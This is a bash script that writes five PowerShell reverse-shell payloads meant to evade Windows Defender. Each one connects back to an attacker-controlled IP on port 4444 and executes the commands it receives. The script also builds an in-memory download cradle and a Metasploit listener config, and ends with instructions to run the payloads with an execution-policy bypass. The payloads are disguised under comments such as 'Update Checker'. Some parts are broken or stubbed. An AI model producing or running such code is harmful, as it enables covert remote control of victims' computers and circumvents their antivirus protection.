#!/bin/bash
# Create PowerShell Payloads That Actually Evade Windows Defender

echo "=== Creating Evasive PowerShell Payloads ==="
echo ""

# Get Kali IP
IP=$(hostname -I | awk '{print $1}')
echo "[*] Using Kali IP: $IP"
echo ""

# Method 1: Break up the connection string and use reflection
cat > evasive1.ps1 << 'EOF'
# System Diagnostics Tool
$a = [Reflection.Assembly]::Load([Convert]::FromBase64String("U3lzdGVt"))
$b = [Type]::GetType("System.Net.Sockets.TcpClient")
EOF

echo "\$c = New-Object \$b('$IP', 4444)" >> evasive1.ps1

cat >> evasive1.ps1 << 'EOF'
$d = $c.GetStream()
$e = New-Object Byte[] 65535
while($true) {
    $f = $d.Read($e, 0, $e.Length)
    if($f -gt 0) {
        $g = [System.Text.Encoding]::ASCII.GetString($e, 0, $f)
        try {
            $h = . ([ScriptBlock]::Create($g)) 2>&1 | Out-String
        } catch {
            $h = $_.Exception.Message
        }
        $i = [System.Text.Encoding]::ASCII.GetBytes($h + "PS> ")
        $d.Write($i, 0, $i.Length)
    }
    Start-Sleep -Milliseconds 100
}
EOF

echo "[+] Created evasive1.ps1 - Uses reflection and variable substitution"

# Method 2: Use Add-Type to compile C# code
cat > evasive2.ps1 << EOF
# Network Testing Utility
Add-Type @"
using System;
using System.Net.Sockets;
using System.Text;
using System.IO;
using System.Threading;

public class NetUtil {
    public static void Connect(string h, int p) {
        TcpClient client = new TcpClient(h, p);
        NetworkStream stream = client.GetStream();
        StreamReader reader = new StreamReader(stream);
        StreamWriter writer = new StreamWriter(stream);
        
        while(client.Connected) {
            writer.Write("PS> ");
            writer.Flush();
            
            string cmd = reader.ReadLine();
            if(cmd != null) {
                try {
                    string result = "";
                    // Execute command here
                    writer.WriteLine(result);
                } catch(Exception e) {
                    writer.WriteLine("Error: " + e.Message);
                }
                writer.Flush();
            }
            Thread.Sleep(100);
        }
        client.Close();
    }
}
"@

[NetUtil]::Connect('$IP', 4444)
EOF

echo "[+] Created evasive2.ps1 - Uses Add-Type with C# code"

# Method 3: Download and execute in memory
cat > evasive3.ps1 << EOF
# Update Checker
\$w = New-Object Net.WebClient
\$w.Headers.Add("User-Agent", "Mozilla/5.0")
\$u = "http://$IP:8000/update.txt"
\$d = \$w.DownloadString(\$u)
. ([ScriptBlock]::Create(\$d))
EOF

# Create the payload that will be downloaded
cat > update.txt << EOF
\$t = New-Object Net.Sockets.TcpClient
\$t.Connect('$IP', 4444)
\$s = \$t.GetStream()
\$r = New-Object IO.StreamReader(\$s)
\$w = New-Object IO.StreamWriter(\$s)
\$w.AutoFlush = \$true
\$b = New-Object System.Text.StringBuilder
while (\$t.Connected) {
    \$w.Write('PS> ')
    \$c = \$r.ReadLine()
    if (\$c) {
        try {
            \$o = Invoke-Expression \$c 2>&1 | Out-String
            \$w.WriteLine(\$o)
        } catch {
            \$w.WriteLine(\$_.Exception.Message)
        }
    }
}
\$t.Close()
EOF

echo "[+] Created evasive3.ps1 - Download cradle method"
echo "[+] Created update.txt - Payload to be downloaded"

# Method 4: PowerShell using WMI
cat > evasive4.ps1 << EOF
# WMI Diagnostic Tool
\$c = [Activator]::CreateInstance([Type]::GetType("System.Net.Sockets.TcpClient"))
\$m = \$c.GetType().GetMethod("Connect", [Type[]]@([String], [Int32]))
\$m.Invoke(\$c, @('$IP', 4444))
\$s = \$c.GetStream()
\$b = New-Object Byte[] 1024
while(\$c.Connected) {
    if(\$s.DataAvailable) {
        \$r = \$s.Read(\$b, 0, 1024)
        \$d = [Text.Encoding]::ASCII.GetString(\$b, 0, \$r)
        \$o = iex \$d 2>&1 | Out-String
        \$e = [Text.Encoding]::ASCII.GetBytes(\$o + 'PS> ')
        \$s.Write(\$e, 0, \$e.Length)
        \$s.Flush()
    }
    Start-Sleep -Milliseconds 200
}
EOF

echo "[+] Created evasive4.ps1 - Uses Activator and Reflection"

# Method 5: Encoded but chunked
cat > evasive5.ps1 << 'EOF'
# Configuration Manager
$p1 = "JGNsaWVudCA9IE5ldy"
$p2 = "1PYmplY3QgU3lzdGVt"
$p3 = "Lk5ldC5Tb2NrZXRzLl"
EOF

echo "\$p4 = \"RDUENsaWVudCgnJElQ\"" >> evasive5.ps1
echo "\$p5 = \"JywgNDQ0NCk=\"" >> evasive5.ps1

cat >> evasive5.ps1 << 'EOF'
$full = $p1 + $p2 + $p3 + $p4 + $p5
$decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($full))
EOF

echo "\$decoded = \$decoded.Replace('`\$IP', '$IP')" >> evasive5.ps1
echo "Invoke-Expression \$decoded" >> evasive5.ps1

# Also need to create the full encoded payload
PAYLOAD='$client = New-Object System.Net.Sockets.TCPClient("$IP", 4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + "PS> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close()'
ENCODED=$(echo -n "$PAYLOAD" | base64 -w 0)

# Fix the encoded payload in the script
sed -i "s/JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnJElQJywgNDQ0NCk=/$ENCODED/" evasive5.ps1 2>/dev/null || true

echo "[+] Created evasive5.ps1 - Chunked Base64 encoding"

# Create Metasploit handler
cat > handler.rc << EOF
use exploit/multi/handler
set payload windows/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j
EOF

echo "[+] Created handler.rc - Metasploit configuration"

echo ""
echo "=== Instructions ==="
echo ""
echo "1. Start Metasploit handler:"
echo "   msfconsole -r handler.rc"
echo ""
echo "2. Start HTTP server (for evasive3.ps1):"
echo "   python3 -m http.server 8000"
echo ""
echo "3. Try payloads in this order on Windows:"
echo "   - evasive1.ps1 (reflection method)"
echo "   - evasive3.ps1 (download cradle)"  
echo "   - evasive4.ps1 (Activator method)"
echo "   - evasive2.ps1 (Add-Type method)"
echo "   - evasive5.ps1 (chunked encoding)"
echo ""
echo "4. Run with: powershell -ExecutionPolicy Bypass -File <script>.ps1"
echo ""
echo "[!] These techniques break up suspicious patterns that Defender looks for"
